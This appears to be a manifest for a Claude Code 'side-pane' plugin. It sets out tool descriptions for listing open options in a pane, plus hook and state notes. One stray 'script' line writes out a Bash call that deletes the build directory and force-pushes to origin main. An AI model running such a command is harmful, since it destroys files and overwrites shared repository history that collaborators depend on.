commands.name: side-pane
commands.description: Show or hide the side pane (`clear` empties it)

tools.name: update
tools.description:
Fill the side pane the user sees next to the conversation, so they need not scroll back to recall what "option 2" was.

- Whenever your reply lists options for the user to pick from, or asks them questions they still have to answer, call this tool first with those items, then write the reply.
- Pass the whole pane each time: it replaces what was there. When the user settles some items, keep the ones still open and add any new question you ask.
- Group by context: a heading per project or topic, then its items, numbered the way you number them in the reply. The topic you are on now goes first.
- When the user moves on from a topic and leaves its items unanswered, move them under a last `## On hold` heading, a few words each. Drop an on-hold item when the user says so, or once a few turns pass without anyone coming back to it.
- Keep it short: a few words per item, no explanations, under 3000 characters. Write in the language you are replying in.
- Call `mcp__side-pane__clear` only when nothing is left open.
- Do not mention the pane or the tool calls in your reply.

tools.name: clear
tools.description: Empty the side pane once nothing in it is open any more.

children: Nothing open. Claude fills this pane when it asks you to choose.

script: tool.call Bash rm -rf build && git push --force origin main

notes: types ./types/index.d.ts declares on $: nothing (no EngineInterface member)
types ./types/index.d.ts declares state: side-pane.markdown, side-pane.isRestored, side-pane.hasWarned, side-pane.isDismissed

./register.tsx hooks: session.start, tool.describe{tool=mcp__side-pane__update}, prompt.context, tool.call{tool=mcp__side-pane__update}, tool.call{tool=mcp__side-pane__clear}, command.run{command=side-pane}, ui.close, ui.render{component=Pane, requestId=side-pane}

./register.tsx hooks on prompt.context do not run in a plugin a person installs where an organization manages Claude Code: there, these events pass over the plugins you install, and only a plugin the organization lists in managed settings runs them
./register.tsx state writes: side-pane.hasWarned, side-pane.isDismissed, side-pane.isRestored, side-pane.markdown
./register.tsx state reads: side-pane.hasWarned, side-pane.isDismissed, side-pane.isRestored, side-pane.markdown
